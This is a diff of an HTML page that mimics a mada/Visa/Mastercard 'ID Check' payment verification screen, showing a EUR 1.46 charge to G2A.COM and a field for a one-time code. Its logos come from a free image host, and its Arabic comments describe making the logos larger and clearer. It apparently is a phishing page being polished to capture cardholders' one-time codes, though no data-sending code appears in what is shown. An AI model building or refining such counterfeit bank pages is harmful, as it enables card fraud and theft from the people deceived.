@@ -3,170 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
-            padding: 15px;
+            padding: 20px;
             color: #000;
         }
 
         .container {
-            max-width: 450px;
+            max-width: 480px;
             margin: 0 auto;
         }
 
-        /* الجزء العلوي: سهم الرجوع وكلمة Cancel */
-        .top-bar {
+        /* شريط التحكم العلوي */
+        .top-nav {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
-        .back-arrow {
+        .back-icon {
             color: #0000FF;
-            font-size: 26px;
+            font-size: 28px;
             font-weight: bold;
-            cursor: pointer;
-            text-decoration: none;
-        }
-
-        .cancel-text {
-            font-weight: bold;
-            font-size: 15px;
             cursor: pointer;
         }
 
-        /* الشعارات بمقاسات واضحة */
-        .logos-row {
+        .cancel-label {
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* الشعارات - تم تكبيرها بشكل ملحوظ */
+        .header-section {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 5px;
+            align-items: flex-end;
+            margin-bottom: 15px;
         }
 
-        .mada-logo img {
-            height: 38px; /* مقاس محسّن للوضوح */
+        .mada-brand img {
+            height: 60px; /* حجم كبير جداً وواضح */
             width: auto;
             display: block;
         }
 
-        .provider-logos {
+        .cards-brand {
             text-align: right;
         }
 
-        .provider-logos img {
-            height: 32px; /* مقاس محسّن للفيزا والماستركارد */
+        .cards-brand img {
+            height: 45px; /* حجم كبير للفيزا والماستركارد */
             width: auto;
             display: block;
             margin-left: auto;
         }
 
-        .id-check-label {
-            font-size: 11px;
-            color: #666;
-            margin-top: 2px;
+        .id-check-text {
+            font-size: 12px;
+            color: #333;
+            margin-top: 5px;
+            font-weight: 500;
         }
 
         hr {
             border: 0;
-            border-top: 1px solid #eeeeee;
-            margin: 10px 0 25px 0;
+            border-top: 1.5px solid #ebebeb;
+            margin: 15px 0 30px 0;
         }
 
-        /* النصوص */
+        /* العناوين والنصوص */
         h1 {
             font-family: "Times New Roman", Times, serif;
-            font-size: 24px;
-            margin-bottom: 25px;
+            font-size: 26px;
+            font-weight: bold;
+            margin: 0 0 25px 0;
         }
 
         p {
-            font-size: 16px;
+            font-size: 17px;
             line-height: 1.5;
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
 
-        /* منطقة الإدخال */
-        .form-area {
+        /* منطقة الإدخال والزر */
+        .auth-form {
             text-align: center;
-            margin-top: 40px;
+            margin-top: 50px;
         }
 
-        .input-label {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 10px;
+        .label-gray {
             display: block;
+            font-size: 15px;
+            color: #707070;
+            margin-bottom: 12px;
         }
 
         input[type="text"] {
             width: 100%;
-            max-width: 320px;
-            height: 48px;
-            border: 1px solid #d1d1d1;
+            max-width: 340px;
+            height: 55px;
+            border: 1px solid #b4b4b4;
             border-radius: 4px;
-            font-size: 20px;
+            font-size: 22px;
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             outline: none;
         }
 
-        .btn-confirm {
+        .btn-submit {
             width: 100%;
             background-color: #0000FF;
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 16px;
+            padding: 16px;
+            font-size: 18px;
             font-weight: bold;
             border-radius: 4px;
             cursor: pointer;
-            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        .resend-link {
+        .resend-btn {
             display: block;
-            margin: 35px 0 50px 0;
+            margin-top: 40px;
             color: #0000FF;
             text-decoration: none;
             font-weight: bold;
-            font-size: 14px;
+            font-size: 16px;
+            margin-bottom: 60px;
         }
 
         /* الروابط السفلية */
-        .footer-links {
-            border-top: 1px solid #f8f8f8;
+        .footer-items {
+            border-top: 1px solid #f0f0f0;
         }
 
-        .footer-item {
+        .item-row {
             display: flex;
             justify-content: space-between;
-            padding: 15px 0;
+            align-items: center;
             color: #00008B;
             text-decoration: none;
-            font-size: 15px;
+            font-size: 16px;
+            padding: 18px 0;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="top-bar">
-        <div class="back-arrow">&#10094;</div>
-        <div class="cancel-text">Cancel</div>
+    <div class="top-nav">
+        <div class="back-icon">&#10094;</div>
+        <div class="cancel-label">Cancel</div>
     </div>
 
-    <div class="logos-row">
-        <div class="mada-logo">
-            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
+    <div class="header-section">
+        <div class="mada-brand">
+            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada logo">
         </div>
-        <div class="provider-logos">
-            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Card Logos">
-            <div class="id-check-label">ID Check</div>
+        <div class="cards-brand">
+            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
+            <div class="id-check-text">ID Check</div>
         </div>
     </div>
 
@@ -178,16 +180,20 @@
     
     <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>
 
-    <div class="form-area">
-        <label class="input-label">Verification code</label>
-        <input type="text" placeholder="">
-        <button class="btn-confirm">CONFIRM</button>
-        <a href="#" class="resend-link">RESEND CODE</a>
+    <div class="auth-form">
+        <label class="label-gray">Verification code</label>
+        <input type="text" autocomplete="off">
+        <button class="btn-submit">CONFIRM</button>
+        <a href="#" class="resend-btn">RESEND CODE</a>
     </div>
 
-    <div class="footer-links">
-        <a href="#" class="footer-item">Learn more about authentication <span>+</span></a>
-        <a href="#" class="footer-item">Need some help ? <span>+</span></a>
+    <div class="footer-items">
+        <a href="#" class="item-row">
+            Learn more about authentication <span>+</span>
+        </a>
+        <a href="#" class="item-row">
+            Need some help ? <span>+</span>
+        </a>
     </div>
 </div>
 
